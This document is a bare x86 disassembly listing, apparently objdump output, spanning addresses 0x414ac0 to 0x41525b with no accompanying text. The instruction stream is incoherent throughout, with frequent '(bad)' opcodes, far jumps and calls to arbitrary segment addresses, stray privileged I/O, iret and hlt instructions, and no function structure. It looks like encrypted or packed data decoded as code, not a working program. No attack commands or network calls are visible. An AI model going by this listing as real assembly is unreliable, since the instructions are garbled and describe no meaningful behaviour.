  414ac0:	aas    
  414ac1:	jmp    0x414acf
  414ac3:	sub    eax,esi
  414ac5:	pop    eax
  414ac6:	scas   eax,DWORD PTR es:[edi]
  414ac7:	fdivr  DWORD PTR [esi]
  414ac9:	jae    0x414a53
  414acb:	stos   BYTE PTR es:[edi],al
  414acc:	sub    BYTE PTR [edi*1-0x679bd73e],ah
  414ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ad4:	test   BYTE PTR [edx+0x47],ch
  414ad7:	lock out 0x7b,al
  414ada:	mov    BYTE PTR [eax],dl
  414adc:	mov    ah,dh
  414ade:	stos   BYTE PTR es:[edi],al
  414adf:	xor    edx,esp
  414ae1:	das    
  414ae2:	mov    edx,0xc74dde41
  414ae7:	pusha  
  414ae8:	cmp    DWORD PTR [edx-0x62de9558],edi
  414aee:	daa    
  414aef:	fidiv  DWORD PTR [esi]
  414af1:	and    DWORD PTR [ebx],edi
  414af3:	add    al,0x27
  414af5:	sbb    al,0x88
  414af7:	add    cl,BYTE PTR [eax]
  414af9:	jecxz  0x414b4c
  414afb:	jmp    0x57d3:0x9acb5c9c
  414b02:	jge    0x414b58
  414b04:	mov    ecx,0x92b76123
  414b09:	sub    eax,DWORD PTR [ebx+0x2f]
  414b0c:	aaa    
  414b0d:	mov    ch,0x61
  414b0f:	xlat   BYTE PTR ds:[ebx]
  414b10:	pusha  
  414b11:	bound  ebp,QWORD PTR [edi+0x72]
  414b14:	jge    0x414b44
  414b16:	sub    eax,0x2105650e
  414b1b:	add    eax,0x30af453c
  414b20:	aaa    
  414b21:	jno    0x414adb
  414b23:	lods   al,BYTE PTR ds:[esi]
  414b24:	adc    esi,DWORD PTR [ebx+0xa97944b]
  414b2a:	in     al,0x48
  414b2c:	mov    al,ds:0x52dd80a9
  414b31:	stc    
  414b32:	and    eax,0x60fc4334
  414b37:	jle    0x414ae7
  414b39:	inc    esp
  414b3a:	mov    bl,0xd5
  414b3c:	fadd   QWORD PTR [edi-0x36]
  414b3f:	pop    ss
  414b40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b41:	fistp  DWORD PTR [ebp-0x61a899cb]
  414b47:	fisubr DWORD PTR [ebx-0x3f]
  414b4a:	fisubr DWORD PTR [edx+0x1]
  414b4d:	adc    ecx,ebx
  414b4f:	jns    0x414b42
  414b51:	addr16 daa 
  414b53:	pop    ebp
  414b54:	(bad)  
  414b55:	jmp    0xc56b:0xe6a190f1
  414b5c:	mov    ah,0x83
  414b5e:	sahf   
  414b5f:	add    cl,al
  414b61:	push   0x56024e9f
  414b66:	rcl    BYTE PTR [edx-0x6098c4cb],1
  414b6c:	push   ecx
  414b6d:	dec    ecx
  414b6e:	(bad)  
  414b6f:	sbb    eax,0xe273db2f
  414b74:	jne    0x414bd6
  414b76:	dec    edi
  414b77:	ins    DWORD PTR es:[edi],dx
  414b78:	fs out dx,al
  414b7a:	stc    
  414b7b:	mov    ah,0xd8
  414b7d:	jo     0x414b37
  414b7f:	add    al,0xb8
  414b81:	fisubr DWORD PTR [esi]
  414b83:	aaa    
  414b84:	fmul   DWORD PTR [ecx]
  414b86:	and    al,0x5d
  414b88:	out    0x45,eax
  414b8a:	add    edx,edx
  414b8c:	lods   al,BYTE PTR ds:[esi]
  414b8d:	cmp    al,0xdb
  414b8f:	push   ebp
  414b90:	and    DWORD PTR [esp+esi*1],ebp
  414b93:	out    0x5,eax
  414b95:	jb     0x414b96
  414b97:	sbb    al,0xb2
  414b99:	aas    
  414b9a:	leave  
  414b9b:	stos   DWORD PTR es:[edi],eax
  414b9c:	jo     0x414bc1
  414b9e:	push   edx
  414b9f:	add    al,0x19
  414ba1:	mov    DWORD PTR [edx-0x6b],ebp
  414ba4:	add    esi,DWORD PTR [ebp+0x5f]
  414ba7:	push   ebp
  414ba8:	or     al,BYTE PTR [edx-0x5f]
  414bab:	xor    eax,0x5fc5885b
  414bb0:	mov    ds:0x2819e50e,eax
  414bb5:	popa   
  414bb6:	sub    ch,0x4
  414bb9:	adc    BYTE PTR ds:0x25bb54df,ah
  414bbf:	inc    eax
  414bc0:	push   edi
  414bc1:	cld    
  414bc2:	push   ss
  414bc3:	jmp    0x414b54
  414bc5:	call   0xfd4e:0x38886f4b
  414bcc:	pushf  
  414bcd:	push   ds
  414bce:	std    
  414bcf:	jmp    0x414c3a
  414bd1:	mov    ds:0xf67298eb,al
  414bd6:	adc    bh,dl
  414bd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bd9:	daa    
  414bda:	dec    edi
  414bdb:	sbb    BYTE PTR [esi+0x60],al
  414bde:	jmp    0x41d30731
  414be3:	or     al,BYTE PTR [ecx-0x7f]
  414be6:	pop    esp
  414be7:	ins    BYTE PTR es:[edi],dx
  414be8:	imul   ebp,DWORD PTR [ecx-0x2b3aa8ea],0x61
  414bef:	(bad)  
  414bf0:	pop    edi
  414bf1:	jbe    0xbde108f7
  414bf7:	mov    eax,DWORD PTR [eax-0x625662e0]
  414bfd:	add    bh,BYTE PTR [edx-0x27ddcc76]
  414c03:	aas    
  414c04:	loop   0x414c63
  414c06:	cmp    BYTE PTR [ebx-0x1dbf5ea5],dl
  414c0c:	xlat   BYTE PTR ds:[ebx]
  414c0d:	(bad)  
  414c0e:	push   esi
  414c0f:	sbb    al,0x20
  414c11:	iret   
  414c12:	xchg   ebp,esi
  414c14:	in     al,dx
  414c15:	iret   
  414c16:	nop
  414c17:	add    bh,dh
  414c19:	shl    esp,1
  414c1b:	neg    esi
  414c1d:	push   ecx
  414c1e:	mov    ch,0x0
  414c20:	arpl   WORD PTR [edx+0x62],cx
  414c23:	push   edi
  414c24:	and    dl,al
  414c26:	hlt    
  414c27:	xchg   esi,eax
  414c28:	jmp    0x414bc6
  414c2a:	lds    ebx,FWORD PTR [ebp+0x7a]
  414c2d:	push   cs
  414c2e:	push   eax
  414c2f:	ror    bh,cl
  414c31:	outs   dx,BYTE PTR ds:[esi]
  414c32:	ret    
  414c33:	repz cmp BYTE PTR [ebp-0x79693e3e],0x72
  414c3b:	push   0xffffff86
  414c3d:	cs dec esi
  414c3f:	iret   
  414c40:	je     0x414cbd
  414c42:	add    ah,al
  414c44:	repz (bad) [edi-0x40]
  414c48:	jb     0x414c93
  414c4a:	pop    ss
  414c4b:	add    dl,dl
  414c4d:	mov    edi,0x1d2db535
  414c52:	inc    ebx
  414c53:	inc    esi
  414c54:	stos   BYTE PTR es:[edi],al
  414c55:	je     0x414c73
  414c57:	dec    ebx
  414c58:	jmp    0xa155:0xe54822ae
  414c5f:	lods   eax,DWORD PTR ds:[esi]
  414c60:	in     eax,dx
  414c61:	arpl   di,di
  414c63:	push   esp
  414c64:	or     DWORD PTR [edi],ecx
  414c66:	push   ebp
  414c67:	mov    bh,0xf2
  414c69:	cld    
  414c6a:	(bad)  
  414c6b:	test   eax,0x48621d6d
  414c70:	push   ebx
  414c71:	push   ds
  414c72:	mov    ah,0xea
  414c74:	(bad)  
  414c75:	mov    esp,0xd0f8a8d4
  414c7a:	mov    ds:0x28d1879d,eax
  414c7f:	loop   0x414c66
  414c81:	stos   BYTE PTR es:[edi],al
  414c82:	out    0x9d,al
  414c84:	cmp    al,0xa4
  414c86:	(bad)  
  414c87:	div    DWORD PTR [edi]
  414c89:	add    eax,0xed861231
  414c8e:	cmp    DWORD PTR [edx],eax
  414c90:	in     eax,dx
  414c91:	or     DWORD PTR [eax+ebx*1+0x2],eax
  414c95:	pop    edx
  414c96:	fisttp QWORD PTR [eax-0x4be18c41]
  414c9c:	sahf   
  414c9d:	fadd   DWORD PTR [ebp-0x7a]
  414ca0:	xchg   esi,eax
  414ca1:	lahf   
  414ca2:	sbb    eax,0x1654d83c
  414ca7:	adc    bl,BYTE PTR [eax+0x20]
  414caa:	mov    eax,0xb3cdd282
  414caf:	in     eax,0xcb
  414cb1:	push   es
  414cb2:	daa    
  414cb3:	ins    DWORD PTR es:[edi],dx
  414cb4:	nop
  414cb5:	lods   eax,DWORD PTR ds:[esi]
  414cb6:	dec    ebp
  414cb7:	clc    
  414cb8:	pop    es
  414cb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cba:	int    0x40
  414cbc:	sahf   
  414cbd:	arpl   WORD PTR es:[ebx+ebx*4],si
  414cc1:	aas    
  414cc2:	pop    esi
  414cc3:	aaa    
  414cc4:	cli    
  414cc5:	out    0x4b,eax
  414cc7:	cmp    DWORD PTR [edx+0x61],esi
  414cca:	xchg   DWORD PTR [ebx],esi
  414ccc:	pop    ebx
  414ccd:	test   al,0xd6
  414ccf:	outs   dx,BYTE PTR ds:[esi]
  414cd0:	inc    ebx
  414cd1:	xchg   DWORD PTR [ecx],ebx
  414cd3:	stos   BYTE PTR es:[edi],al
  414cd4:	jp     0x414c9f
  414cd6:	or     al,BYTE PTR [edi+0x14]
  414cd9:	jg     0x414c5d
  414cdb:	inc    ecx
  414cdc:	adc    DWORD PTR [esi+0x62],ecx
  414cdf:	data16 jb 0x414cf9
  414ce2:	jmp    0xa7b7:0xc8690170
  414ce9:	pop    es
  414cea:	int3   
  414ceb:	jbe    0x414c9b
  414ced:	hlt    
  414cee:	or     edx,DWORD PTR [ebx+0x5b276d43]
  414cf4:	mov    dh,0x73
  414cf6:	jecxz  0x414ccc
  414cf8:	sub    BYTE PTR [edi-0x4dcfcc3c],bl
  414cfe:	fwait
  414cff:	and    edx,edx
  414d01:	cmp    DWORD PTR [edi+0x20],ecx
  414d04:	add    edx,DWORD PTR [edx]
  414d06:	mov    ebp,0xa06d0618
  414d0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d0c:	or     BYTE PTR [ebx],dl
  414d0e:	xchg   ebp,eax
  414d0f:	dec    edi
  414d10:	ins    DWORD PTR es:[edi],dx
  414d11:	je     0x414ced
  414d13:	sbb    eax,DWORD PTR [edi]
  414d15:	push   cs
  414d16:	(bad)  
  414d18:	inc    ebp
  414d19:	jae    0x414ccc
  414d1b:	rcl    DWORD PTR [ebp+0x3205e63a],0xcf
  414d22:	js     0x414d26
  414d24:	mov    ebp,0xd8389851
  414d29:	out    dx,eax
  414d2a:	in     eax,0xef
  414d2c:	fwait
  414d2d:	dec    dh
  414d2f:	add    cl,ch
  414d31:	iret   
  414d32:	ss xchg esi,eax
  414d34:	imul   ecx,DWORD PTR [edx-0x2f98472c],0x565f01ba
  414d3e:	adc    bh,al
  414d40:	mov    ebp,0xadb4b5bb
  414d45:	or     BYTE PTR [ecx+0x7c5ee08f],ch
  414d4b:	leave  
  414d4c:	push   esi
  414d4d:	pop    esi
  414d4e:	jb     0x414da2
  414d50:	jns    0x414cea
  414d52:	ins    DWORD PTR es:[edi],dx
  414d53:	fidiv  WORD PTR [esi+ecx*2]
  414d56:	lods   al,BYTE PTR ds:[esi]
  414d57:	sbb    ebx,DWORD PTR [edi-0x65]
  414d5a:	pop    ebx
  414d5b:	cli    
  414d5c:	rol    BYTE PTR es:[ecx+0x36336acb],1
  414d63:	jae    0x414ce7
  414d65:	xor    bh,0xe9
  414d68:	adc    al,dl
  414d6a:	shl    ch,1
  414d6c:	enter  0x6fd0,0xb
  414d70:	xchg   edx,eax
  414d71:	ds jbe 0x414d43
  414d74:	mov    ecx,0x5bbfa806
  414d79:	and    edx,DWORD PTR [edi+0x483a2ea5]
  414d7f:	jno    0x414de7
  414d81:	out    dx,eax
  414d82:	pop    esp
  414d83:	add    dh,bh
  414d85:	xor    DWORD PTR [ebx+0x1ce515e9],esp
  414d8b:	sub    edi,DWORD PTR [eax+0x1d]
  414d8e:	or     DWORD PTR [ebx-0x35],esi
  414d91:	mov    ds:0xf324b1a1,al
  414d96:	xor    DWORD PTR [ecx+esi*8],0xffffff88
  414d9a:	pop    ss
  414d9b:	jae    0x414dda
  414d9d:	or     eax,esp
  414d9f:	rol    ebx,1
  414da1:	shl    DWORD PTR [ebx+0x72d3e508],cl
  414da7:	inc    edi
  414da8:	dec    eax
  414da9:	jg     0x414d52
  414dab:	test   ecx,edi
  414dad:	mov    bh,0xe6
  414daf:	sahf   
  414db0:	ror    DWORD PTR [ebx+0x19],0x9c
  414db4:	cdq    
  414db5:	dec    eax
  414db6:	sub    cl,bh
  414db8:	and    eax,0xfeaab123
  414dbd:	int    0x5b
  414dbf:	retf   
  414dc0:	cmovb  eax,DWORD PTR [eax*8+0x6efb1114]
  414dc8:	cmp    ebx,DWORD PTR [edx+0x4dd08109]
  414dce:	jle    0x414e2f
  414dd0:	cmp    dh,BYTE PTR [esp+ebx*1-0x4bf25f96]
  414dd7:	or     ebp,DWORD PTR [ebp+0x67]
  414dda:	mov    ch,0x77
  414ddc:	sti    
  414ddd:	dec    DWORD PTR [ebx-0x4b]
  414de0:	push   ss
  414de1:	lahf   
  414de2:	js     0x414e0f
  414de4:	add    dh,al
  414de6:	jmp    0x414dfa
  414de8:	enter  0xd60b,0xf0
  414dec:	mov    cl,0x1b
  414dee:	test   al,0x31
  414df0:	scas   al,BYTE PTR es:[edi]
  414df1:	jae    0x414dfd
  414df3:	xor    edx,ebx
  414df5:	push   edx
  414df6:	mov    bh,0x50
  414df8:	mov    DWORD PTR [ecx+0x50],edx
  414dfb:	mov    edi,esp
  414dfd:	rcl    DWORD PTR [esi+ecx*8],0x99
  414e01:	pop    esi
  414e02:	xrelease mov BYTE PTR [ebx-0x34],cl
  414e06:	push   edx
  414e07:	imul   ebp,eax,0xffffffd0
  414e0a:	sub    eax,0xed2a48d9
  414e0f:	jo     0x414e5f
  414e11:	lds    esp,FWORD PTR [esi-0x4a]
  414e14:	jo     0x414e6c
  414e16:	or     edx,DWORD PTR [ebx-0x55]
  414e19:	call   0x3447:0xaba1b9d2
  414e20:	jp     0x414dcb
  414e22:	sub    al,0xd8
  414e24:	mov    al,cs:0x38b4348c
  414e2a:	sti    
  414e2b:	sahf   
  414e2c:	jno    0x414ddf
  414e2e:	lahf   
  414e2f:	mov    ds:0xb6e89bc,al
  414e34:	mov    dl,0x3a
  414e36:	not    DWORD PTR [edx]
  414e38:	in     eax,0x1d
  414e3a:	xchg   edi,eax
  414e3b:	bnd jo 0x414e54
  414e3e:	adc    al,0x50
  414e40:	mov    edi,0xe7e59e1c
  414e45:	clc    
  414e46:	pop    edx
  414e47:	cmp    al,0x3
  414e49:	xchg   DWORD PTR [edi+0x35],esp
  414e4c:	jae    0x414e62
  414e4e:	mov    edi,0xb6e6afd4
  414e53:	retf   0x3897
  414e56:	popf   
  414e57:	lahf   
  414e58:	add    ch,BYTE PTR [ebp+0x51742bba]
  414e5e:	nop
  414e5f:	mov    al,0x17
  414e61:	pusha  
  414e62:	pop    eax
  414e63:	ins    DWORD PTR es:[edi],dx
  414e64:	dec    esi
  414e65:	xor    al,0x8f
  414e67:	and    eax,0x3c6ec3e9
  414e6c:	pop    esi
  414e6d:	ror    edx,0x5f
  414e70:	(bad)  
  414e71:	aam    0x9e
  414e73:	cmp    eax,0x5bff127d
  414e78:	mov    ecx,0x515f6a8a
  414e7d:	leave  
  414e7e:	push   ebx
  414e7f:	pop    ebp
  414e80:	cld    
  414e81:	xchg   BYTE PTR [eax+edi*8],bh
  414e84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e85:	mov    al,ds:0x6a96ef64
  414e8a:	adc    BYTE PTR [edi+0x31],bh
  414e8d:	(bad)  
  414e8e:	cmp    al,0x4c
  414e90:	jle    0x414eb7
  414e92:	fist   DWORD PTR [edx-0xc28751e]
  414e98:	cld    
  414e99:	xchg   edx,eax
  414e9a:	fs scas al,BYTE PTR es:[edi]
  414e9c:	pusha  
  414e9d:	lahf   
  414e9e:	imul   ebp,DWORD PTR [ebp+0x58],0xffffffd5
  414ea2:	(bad)  [ebp+eax*2+0x11b91fcb]
  414ea9:	cmp    dh,BYTE PTR [ecx]
  414eab:	add    cl,ah
  414ead:	adc    al,BYTE PTR [eax-0x4a]
  414eb0:	jecxz  0x414e7d
  414eb2:	or     DWORD PTR [ebx+0x37e9aace],eax
  414eb8:	es ins DWORD PTR es:[edi],dx
  414eba:	jl     0x414f2c
  414ebc:	(bad)  
  414ebd:	or     dl,0x4c
  414ec0:	sbb    eax,0x82da9ac6
  414ec5:	push   ebx
  414ec6:	(bad)  
  414ec7:	fbstp  TBYTE PTR [edi]
  414ec9:	(bad)  
  414eca:	jb     0x414f40
  414ecc:	scas   al,BYTE PTR es:[edi]
  414ecd:	call   0xbf9808ac
  414ed2:	and    al,BYTE PTR [ebx-0x665b8130]
  414ed8:	or     ebx,esi
  414eda:	sar    DWORD PTR [ecx-0x35],0x51
  414ede:	xchg   DWORD PTR [ecx+0x3a],esi
  414ee1:	jmp    0x11d5:0x25a1893c
  414ee8:	inc    esi
  414ee9:	in     eax,0x83
  414eeb:	sub    al,0x4
  414eed:	pop    ebx
  414eee:	out    0xe3,eax
  414ef0:	mov    edi,ebx
  414ef2:	sti    
  414ef3:	mov    ch,0x30
  414ef5:	ins    BYTE PTR es:[edi],dx
  414ef6:	adc    eax,0x3840a325
  414efb:	cmc    
  414efc:	cwde   
  414efd:	(bad)  
  414efe:	jmp    0xc8da921
  414f03:	js     0x414ef5
  414f05:	sti    
  414f06:	es jl  0x414f1d
  414f09:	mov    esp,0x3f42259c
  414f0e:	cmp    eax,0x9926cd67
  414f13:	fidiv  DWORD PTR [ebx-0x4e]
  414f16:	push   es
  414f17:	push   ecx
  414f18:	aaa    
  414f19:	das    
  414f1a:	fcom   DWORD PTR [ecx-0x6b]
  414f1d:	xchg   edx,eax
  414f1e:	adc    ecx,DWORD PTR [eax+eax*4-0x417dbd02]
  414f25:	cmp    al,0xe2
  414f27:	test   al,0xee
  414f29:	ins    BYTE PTR es:[di],dx
  414f2b:	pop    edx
  414f2c:	mov    bl,dh
  414f2e:	xor    ecx,DWORD PTR [edx]
  414f30:	cmp    BYTE PTR [esp+esi*1],0xa4
  414f34:	cmp    BYTE PTR [edi+0x17],bh
  414f37:	inc    esi
  414f38:	add    BYTE PTR [esi-0x46],bl
  414f3b:	xchg   BYTE PTR [ebp+0x35],dh
  414f3e:	popa   
  414f3f:	add    dh,BYTE PTR [ebx]
  414f41:	dec    eax
  414f42:	jp     0x414f39
  414f44:	sbb    al,0xfd
  414f46:	lods   al,BYTE PTR ds:[esi]
  414f47:	cli    
  414f48:	stc    
  414f49:	mov    esp,0x1c93a6cd
  414f4e:	imul   edx,DWORD PTR [ebx+0x1965d648],0x8cb08457
  414f58:	lds    eax,FWORD PTR [esi+0x4fffda77]
  414f5e:	mul    BYTE PTR [edi-0x3c505483]
  414f64:	popa   
  414f65:	inc    edi
  414f66:	add    eax,0xeb05cebb
  414f6b:	mov    eax,ds:0x61b0f49d
  414f70:	mov    ebp,DWORD PTR [edi+0x41]
  414f73:	cld    
  414f74:	push   ds
  414f75:	test   ch,ch
  414f77:	push   ebp
  414f78:	dec    ecx
  414f79:	jno    0x414fb5
  414f7b:	cli    
  414f7c:	sub    ebx,DWORD PTR [ecx+edi*8-0x2e5e486a]
  414f83:	in     eax,0x96
  414f85:	ret    0x7c57
  414f88:	pop    ss
  414f89:	sbb    DWORD PTR [eax],esp
  414f8b:	out    0x75,al
  414f8d:	push   ds
  414f8e:	arpl   si,bx
  414f90:	cmp    eax,0xf815d6d
  414f95:	jnp    0x414f52
  414f97:	push   ss
  414f98:	ficomp DWORD PTR [ebp+0x5b3cef53]
  414f9e:	les    eax,FWORD PTR [edx-0x4a4b1a07]
  414fa4:	lock sbb eax,0x5f7a21e3
  414faa:	mov    ah,0x1e
  414fac:	pop    ss
  414fad:	sahf   
  414fae:	cmp    BYTE PTR [ebp+0x43],dh
  414fb1:	adc    DWORD PTR [ecx-0x57928718],0x9606dd62
  414fbb:	push   es
  414fbc:	mov    ch,0x8e
  414fbe:	mov    ch,0x1c
  414fc0:	sub    ebx,DWORD PTR [ebx]
  414fc2:	daa    
  414fc3:	or     al,0x1d
  414fc5:	lods   al,BYTE PTR ds:[esi]
  414fc6:	mul    DWORD PTR [edi+0x22]
  414fc9:	dec    edi
  414fca:	out    dx,eax
  414fcb:	push   cs
  414fcc:	pop    esp
  414fcd:	pcmpeqw mm0,QWORD PTR [esi]
  414fd0:	mov    ds:0x58fe3476,al
  414fd5:	cdq    
  414fd6:	xchg   esp,eax
  414fd7:	pop    edx
  414fd8:	ins    DWORD PTR es:[edi],dx
  414fd9:	xchg   edi,eax
  414fda:	pop    ds
  414fdb:	lock jno 0x414fa4
  414fde:	mov    DWORD PTR [ecx-0x162fcca2],ebx
  414fe4:	cmp    BYTE PTR [ebx],ch
  414fe6:	cld    
  414fe7:	xor    al,0x41
  414fe9:	lds    ecx,FWORD PTR [esp+ecx*2]
  414fec:	hlt    
  414fed:	inc    ecx
  414fee:	pop    edx
  414fef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ff0:	jbe    0x414fda
  414ff2:	mov    ebp,0x62239e3d
  414ff7:	add    edi,esi
  414ff9:	and    ah,dh
  414ffb:	mov    ebp,0xac764e3e
  415000:	xor    BYTE PTR [ebx-0x409e20e9],dh
  415006:	iret   
  415007:	lds    ebp,FWORD PTR [esi+0x76a91d14]
  41500d:	lahf   
  41500e:	lods   al,BYTE PTR ds:[esi]
  41500f:	mov    eax,0x602618a9
  415014:	sbb    al,0x9c
  415016:	cmc    
  415017:	push   ss
  415018:	inc    cx
  41501a:	fidivr DWORD PTR [esi]
  41501c:	mov    dh,0x7b
  41501e:	int    0xcf
  415020:	sub    ah,BYTE PTR [ecx-0x3b42b37a]
  415026:	loop   0x415037
  415028:	popa   
  415029:	ss pop ds
  41502b:	ret    0x1a84
  41502e:	jb     0x414ff3
  415030:	mov    ebp,0x6a3751b3
  415035:	les    eax,FWORD PTR [esi-0x54]
  415038:	pop    ecx
  415039:	add    dh,BYTE PTR [edx]
  41503b:	push   edi
  41503c:	test   eax,0xc1179514
  415041:	jge    0x415082
  415043:	in     eax,0xbb
  415045:	jge    0x41502b
  415047:	dec    ebp
  415048:	(bad)  
  415049:	dec    edx
  41504a:	jecxz  0x415080
  41504c:	lock sbb al,0x5
  41504f:	jge    0x415058
  415051:	or     eax,0xcad3c928
  415056:	pop    ebx
  415057:	pusha  
  415058:	outs   dx,DWORD PTR ds:[esi]
  415059:	cwde   
  41505a:	inc    esp
  41505b:	xchg   edx,eax
  41505c:	popa   
  41505d:	jae    0x415047
  41505f:	sbb    dl,BYTE PTR [edx]
  415061:	jnp    0x41504a
  415063:	and    eax,0x908715c0
  415068:	je     0x41502c
  41506a:	jmp    0x415024
  41506c:	and    al,0xf3
  41506e:	and    al,0x4c
  415070:	mov    esi,0x628f616
  415075:	xchg   ebx,eax
  415076:	dec    esp
  415077:	adc    ebx,eax
  415079:	cmp    BYTE PTR [esp+ecx*2-0x15],0x50
  41507e:	rcr    edi,0x2
  415081:	ret    
  415082:	fsubr  st,st(5)
  415084:	inc    ebp
  415085:	clc    
  415086:	retf   
  415087:	jbe    0x415041
  415089:	mov    bh,0x28
  41508b:	mov    ah,0xb3
  41508d:	out    0xee,eax
  41508f:	mov    ds:0x6b794c89,eax
  415094:	adc    eax,0xac70c7ce
  415099:	mov    edi,0xd2e3810c
  41509e:	cmp    BYTE PTR [esi-0x3165eab],bh
  4150a4:	jae    0x41502d
  4150a6:	pop    eax
  4150a7:	mov    ds:0x24714d23,eax
  4150ac:	mov    cl,0x90
  4150ae:	xor    bh,cl
  4150b0:	jp     0x41509c
  4150b2:	adc    ch,bh
  4150b4:	jmp    0x13591812
  4150b9:	mov    ch,0xe0
  4150bb:	shl    DWORD PTR [eax+0x3b],1
  4150be:	pop    esp
  4150bf:	out    dx,al
  4150c0:	ins    BYTE PTR es:[edi],dx
  4150c1:	ret    
  4150c2:	iret   
  4150c3:	jb     0x4150be
  4150c5:	in     eax,0x57
  4150c7:	sbb    eax,0xbef8d272
  4150cc:	js     0x4150c4
  4150ce:	js     0x41505c
  4150d0:	pop    ebp
  4150d1:	xchg   ebx,eax
  4150d2:	fist   DWORD PTR [ebp+0x30]
  4150d5:	ds pop ecx
  4150d7:	mov    dh,0xfc
  4150d9:	xchg   ebp,eax
  4150da:	fmulp  st(2),st
  4150dc:	cmp    DWORD PTR [eax],esi
  4150de:	aam    0x36
  4150e0:	rcl    BYTE PTR [edi],0x29
  4150e3:	into   
  4150e4:	and    BYTE PTR [ebx],bh
  4150e6:	pusha  
  4150e7:	jecxz  0x415093
  4150e9:	and    BYTE PTR [ebx+edi*4-0x7c],al
  4150ed:	add    BYTE PTR [esi],ah
  4150ef:	imul   esi,esp,0xc3e9a193
  4150f5:	mov    esi,0xa986ec3f
  4150fa:	sbb    bh,BYTE PTR [edi]
  4150fc:	pusha  
  4150fd:	mov    al,0xab
  4150ff:	lods   eax,DWORD PTR ds:[esi]
  415100:	push   edi
  415101:	pop    ebp
  415102:	mov    dh,0xec
  415105:	dec    ecx
  415106:	pop    edi
  415107:	sub    BYTE PTR [edi-0x3b],al
  41510a:	in     eax,dx
  41510b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41510c:	das    
  41510d:	nop
  41510e:	ja     0x41512d
  415110:	scas   eax,DWORD PTR es:[edi]
  415111:	dec    esp
  415112:	pop    eax
  415113:	or     edi,DWORD PTR [ebp+0x4b]
  415116:	adc    esi,edx
  415118:	ins    DWORD PTR es:[edi],dx
  415119:	mov    ds:0xd2aa9da7,al
  41511e:	xor    al,0xbb
  415120:	outs   dx,BYTE PTR ds:[esi]
  415121:	loopne 0x415191
  415123:	(bad)  
  415124:	fld    TBYTE PTR [ecx+0x106c5a8c]
  41512a:	bswap  esi
  41512c:	mov    ds:0x391c36af,al
  415131:	and    BYTE PTR [esi],0xe4
  415134:	inc    edi
  415135:	lods   eax,DWORD PTR ds:[esi]
  415136:	not    DWORD PTR [edi+eiz*4+0x1282fc1b]
  41513d:	push   edi
  41513e:	fs push ss
  415140:	mov    esi,0x4c9e32f9
  415145:	fucomp st(3)
  415147:	jae    0x415176
  415149:	mov    ebp,0x43b4df98
  41514e:	push   cs
  41514f:	call   FWORD PTR [eax]
  415151:	lahf   
  415152:	adc    cl,BYTE PTR [ebx+ebx*1+0x1]
  415156:	sub    eax,DWORD PTR [ebx+ecx*8-0x61]
  41515a:	fwait
  41515b:	adc    al,0x8b
  41515d:	lods   eax,DWORD PTR ds:[esi]
  41515e:	lods   al,BYTE PTR ds:[esi]
  41515f:	or     eax,DWORD PTR [ebx+0x2b825589]
  415165:	mov    esp,0x946c086b
  41516a:	or     ebp,ebp
  41516c:	push   eax
  41516d:	jge    0x4151da
  41516f:	mov    al,0x87
  415171:	loop   0x41518e
  415173:	sub    DWORD PTR [esi+0x5ba1d9e1],0x9a3c15a3
  41517d:	mov    dh,0x5c
  41517f:	jbe    0x4151b0
  415181:	test   al,0x87
  415183:	call   DWORD PTR [edx+0x1fee7216]
  415189:	scas   al,BYTE PTR es:[edi]
  41518a:	test   eax,0x45e113e7
  41518f:	cmp    ch,0xce
  415192:	or     ecx,DWORD PTR [ecx]
  415194:	push   edi
  415195:	sahf   
  415196:	neg    DWORD PTR [ebx-0x1df99acb]
  41519c:	mov    esp,0x1d06f473
  4151a1:	add    BYTE PTR [edx],bh
  4151a3:	or     ebp,DWORD PTR [edi+ebp*8-0x31905fa6]
  4151aa:	mov    eax,ds:0xcce13c3d
  4151af:	adc    DWORD PTR [ebx],edi
  4151b1:	push   eax
  4151b2:	aaa    
  4151b3:	inc    ebp
  4151b4:	xchg   edx,eax
  4151b5:	mov    eax,0x93d9f459
  4151ba:	xchg   BYTE PTR [eax+0x47],ah
  4151bd:	cmp    dl,BYTE PTR [edi]
  4151bf:	in     eax,dx
  4151c0:	xchg   edi,eax
  4151c1:	push   esp
  4151c2:	push   edx
  4151c3:	mov    ah,0x2f
  4151c5:	cmp    al,0xe5
  4151c7:	pop    ebx
  4151c8:	mov    bh,0x68
  4151ca:	dec    edx
  4151cb:	cdq    
  4151cc:	adc    al,0xe5
  4151ce:	dec    edi
  4151cf:	call   0xbf4cc0ed
  4151d4:	fisttp DWORD PTR [ebp-0x1d70cdf0]
  4151da:	sbb    eax,0x9b03fee8
  4151df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151e0:	sti    
  4151e1:	ret    0xb5cc
  4151e4:	jp     0x415188
  4151e6:	repnz dec DWORD PTR [edi+0x6b663506]
  4151ed:	in     eax,0xb9
  4151ef:	add    cl,al
  4151f1:	or     eax,0x704bd8d0
  4151f6:	cmp    dh,cl
  4151f8:	imul   ebx,DWORD PTR [eax+eiz*2-0x9],0xe51cc8
  415200:	xor    eax,0xe2eb81a4
  415205:	or     al,0x89
  415207:	mov    al,ds:0xc690daf3
  41520c:	aas    
  41520d:	xlat   BYTE PTR ds:[ebx]
  41520e:	or     al,0xe0
  415210:	in     eax,0x1d
  415212:	(bad)  
  415213:	and    al,0x2a
  415215:	and    ebx,DWORD PTR [ecx-0x56a6255e]
  41521b:	jnp    0x41524f
  41521d:	and    al,BYTE PTR [edi+edi*8+0x71642175]
  415224:	dec    edi
  415225:	cld    
  415226:	jmp    0x4151fe
  415228:	or     eax,0xe78ef825
  41522d:	shr    DWORD PTR [eax-0x112bd705],1
  415233:	xor    BYTE PTR [edx-0x701d2e50],ch
  415239:	in     al,0x45
  41523b:	call   0xb3bfd7c0
  415240:	cpuid  
  415242:	push   esp
  415243:	ds jecxz 0x4152a7
  415246:	fnstsw WORD PTR [esi+0x6f]
  415249:	inc    esi
  41524a:	pop    edi
  41524b:	push   ecx
  41524c:	loop   0x415203
  41524e:	mov    BYTE PTR [edi],cl
  415250:	(bad)  
  415251:	cmc    
  415252:	popf   
  415253:	test   eax,0x4e3fd11e
  415258:	data16 sub bh,ah
  41525b:	and    ecx,eax
